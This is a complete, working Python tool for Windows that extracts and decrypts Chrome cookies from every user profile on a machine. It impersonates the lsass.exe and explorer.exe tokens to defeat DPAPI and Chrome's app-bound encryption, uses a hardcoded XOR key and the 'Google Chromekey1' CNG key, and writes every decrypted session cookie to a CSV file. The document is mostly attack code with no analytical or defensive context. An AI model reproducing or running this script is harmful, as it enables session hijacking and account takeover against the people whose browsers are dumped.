import os
import io
import json
import struct
import ctypes
import sqlite3
import shutil
import csv
import binascii
from contextlib import contextmanager

# Requirements: pip install pycryptodome PythonForWindows
import windows
import windows.security
import windows.crypto
import windows.generated_def as gdef
from Crypto.Cipher import AES

# Minimalist style: camelCase, small names, good spacing.

def isAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonateLsass():
    originalToken = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        lsassProc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
        impToken = lsassProc.token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impToken
        yield
    finally:
        windows.current_thread.token = originalToken

@contextmanager
def impersonateToken(procToken):
    originalToken = windows.current_thread.token
    try:
        impToken = procToken.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impToken
        yield
    finally:
        windows.current_thread.token = originalToken

def parseKeyBlob(blobData: bytes) -> dict:
    buffer = io.BytesIO(blobData)
    parsed = {}
    headerLen = struct.unpack('<I', buffer.read(4))[0]
    parsed['header'] = buffer.read(headerLen)
    contentLen = struct.unpack('<I', buffer.read(4))[0]
    parsed['flag'] = buffer.read(1)[0]
    
    if parsed['flag'] in [1, 2]:
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    elif parsed['flag'] == 3:
        parsed['encrypted_aes_key'] = buffer.read(32)
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    return parsed

def decryptWithCng(inputData):
    ncrypt = ctypes.windll.NCRYPT
    hProv = gdef.NCRYPT_PROV_HANDLE()
    ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProv), "Microsoft Software Key Storage Provider", 0)
    hKey = gdef.NCRYPT_KEY_HANDLE()
    ncrypt.NCryptOpenKey(hProv, ctypes.byref(hKey), "Google Chromekey1", 0, 0)
    
    res = gdef.DWORD(0)
    inBuf = (ctypes.c_ubyte * len(inputData)).from_buffer_copy(inputData)
    ncrypt.NCryptDecrypt(hKey, inBuf, len(inBuf), None, None, 0, ctypes.byref(res), 0x40)
    
    outBuf = (ctypes.c_ubyte * res.value)()
    ncrypt.NCryptDecrypt(hKey, inBuf, len(inBuf), None, outBuf, res.value, ctypes.byref(res), 0x40)
    
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProv)
    return bytes(outBuf[:res.value])

def byteXor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def decryptValue(encrypted_val, master_key):
    try:
        # Check for v10 or v20 prefix
        if encrypted_val[:3] in [b'v10', b'v20']:
            nonce = encrypted_val[3:15]
            payload = encrypted_val[15:-16]
            tag = encrypted_val[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode('utf-8', errors='ignore')
        else:
            # Fallback for older DPAPI-only cookies (rare now)
            return "(Legacy DPAPI - Not Supported in this Script)"
    except Exception:
        return "(Decryption Failed)"

def processUserCookies(userPath, writer):
    uName = os.path.basename(userPath)
    # Filter out system/default folders
    if uName.lower() in ["public", "all users", "default user", "administrator", "default"]: return

    statePath = os.path.join(userPath, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(statePath): return

    # Fix env for DPAPI
    originalHome = os.environ.get('USERPROFILE')
    os.environ['USERPROFILE'] = userPath

    try:
        # --- KEY EXTRACTION START ---
        with open(statePath, "r", encoding="utf-8") as f:
            js = json.load(f)

        if "os_crypt" not in js or "app_bound_encrypted_key" not in js["os_crypt"]: return
        boundKey = binascii.a2b_base64(js["os_crypt"]["app_bound_encrypted_key"])[4:]
        
        # 1. Decrypt App-Bound Key (SYSTEM)
        sysDec = None
        with impersonateLsass():
            try:
                sysDec = windows.crypto.dpapi.unprotect(boundKey)
            except:
                return

        # 2. Decrypt User Key (User Token via Explorer)
        usrDec = None
        explorer_procs = [p for p in windows.system.processes if p.name.lower() == "explorer.exe"]
        success = False
        
        for proc in explorer_procs:
            try:
                with impersonateToken(proc.token):
                    try:
                        usrDec = windows.crypto.dpapi.unprotect(sysDec)
                        success = True
                        break
                    except:
                        continue
            except:
                continue
        
        if not success:
            print(f"[-] Could not decrypt key for {uName} (User not active?)")
            return

        pData = parseKeyBlob(usrDec)
        xorK = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        
        # 3. Decrypt AES Key (SYSTEM)
        decAes = None
        with impersonateLsass():
            decAes = decryptWithCng(pData['encrypted_aes_key'])
        
        realK = byteXor(decAes, xorK)
        masterK = AES.new(realK, AES.MODE_GCM, nonce=pData['iv']).decrypt_and_verify(pData['ciphertext'], pData['tag'])
        # --- KEY EXTRACTION END ---

        # --- COOKIE PROCESSING ---
        baseDir = os.path.join(userPath, "AppData", "Local", "Google", "Chrome", "User Data")
        
        for prof in os.listdir(baseDir):
            # Check both new (Network/) and old paths
            cookiePaths = [
                os.path.join(baseDir, prof, "Network", "Cookies"),
                os.path.join(baseDir, prof, "Cookies")
            ]
            
            targetDb = None
            for cp in cookiePaths:
                if os.path.exists(cp):
                    targetDb = cp
                    break
            
            if targetDb:
                tmp = f"temp_cookies_{uName}_{prof}.db"
                shutil.copyfile(targetDb, tmp)
                
                try:
                    db = sqlite3.connect(tmp)
                    # Query cookies. 'host_key' is the domain.
                    cursor = db.execute("SELECT host_key, name, encrypted_value, path, is_secure FROM cookies")
                    
                    count = 0
                    for r in cursor:
                        host, name, enc_val, path, is_secure = r[0], r[1], r[2], r[3], r[4]
                        
                        val = decryptValue(enc_val, masterK)
                        if val and val != "(Decryption Failed)":
                            writer.writerow([uName, prof, host, name, val, path, is_secure])
                            count += 1
                    
                    if count > 0:
                        print(f"[+] {uName} ({prof}): Dumped {count} cookies.")
                    db.close()
                except Exception as e:
                    print(f"[!] SQLite Error {uName}/{prof}: {e}")
                finally:
                    if os.path.exists(tmp): os.remove(tmp)

    except Exception as e:
        print(f"[!] Error {uName}: {e}")
    finally:
        if originalHome: os.environ['USERPROFILE'] = originalHome

def main():
    if not isAdmin():
        print("Run as Admin!")
        return

    csvF = "dumped_cookies.csv"
    uDir = "C:\\Users"

    print(f"[*] Starting Cookie Dump to {csvF}...")

    with open(csvF, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["WindowsUser", "Profile", "Host", "Name", "Value", "Path", "IsSecure"])
        
        for folder in os.listdir(uDir):
            p = os.path.join(uDir, folder)
            if os.path.isdir(p):
                processUserCookies(p, w)

    print(f"\n[+] Done! Saved to: {csvF}")

if __name__ == "__main__":
    main()
